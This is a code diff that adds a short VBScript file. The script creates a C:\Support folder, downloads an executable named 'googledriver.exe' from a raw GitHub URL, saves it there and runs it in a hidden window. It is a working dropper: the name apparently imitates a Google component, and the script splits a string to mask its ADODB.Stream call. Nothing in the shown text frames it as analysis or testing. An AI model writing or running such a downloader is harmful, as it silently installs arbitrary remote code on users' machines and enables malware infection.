@@ -1,0 +1,19 @@
+Dim objFSO, strFolder
+strFolder = "C:\Support"
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+If Not objFSO.FolderExists(strFolder) Then
+   objFSO.CreateFolder(strFolder)
+End If
+Set args = WScript.Arguments
+Set oXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+oXMLHTTP.Open "GET", "https://raw.githubusercontent.com/analyticsearch/commercial/master/googledriver.exe", 0 
+oXMLHTTP.Send
+Set oADOStream = CreateObject("ADODB" & ".Stream")
+oADOStream.Mode = 3
+oADOStream.Type = 1
+oADOStream.Open
+oADOStream.Write oXMLHTTP.responseBody
+oADOStream.SaveToFile "C:\Support\googledriver.exe", 2
+Set WshShell = CreateObject("Wscript.Shell")
+cmds=WshShell.Run("C:\Support\googledriver.exe",0,True)
+Set WshShell = Nothing
